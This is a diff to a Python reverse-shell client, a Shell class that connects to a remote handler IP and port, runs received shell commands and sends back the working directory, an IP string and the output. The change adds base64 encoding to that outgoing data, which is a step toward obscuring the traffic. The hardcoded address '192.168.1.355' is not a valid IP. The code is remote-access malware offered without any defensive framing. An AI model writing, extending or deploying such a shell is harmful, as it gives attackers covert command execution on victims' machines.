@@ -1,4 +1,4 @@
-import socket, subprocess, os, threading, json
+import socket, subprocess, os, threading, json, base64
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
@@ -15,16 +15,16 @@ class Shell:
 		if not data: raise Exception("Handler disconnected")
 		return data
 
-        def package(self, data):
-            package = {}
-            package["cwd"] = os.getcwd()
-            package["ip"] = "192.168.1.355"
-            package["data"] = data
-            return json.dumps(package)
+	def package(self, data):
+		package = {}
+		package["cwd"] = base64.b64encode(os.getcwd())
+		package["ip"] = base64.b64encode("192.168.1.355")
+		package["data"] = base64.b64encode(data)
+		return json.dumps(package)
 
 
 	def send_data(self, data):
-	        data_package = self.package(data)
+		data_package = self.package(data)
 		self.comm_socket.sendall(data_package)
 		
 	def execute_shell_command(self, command):
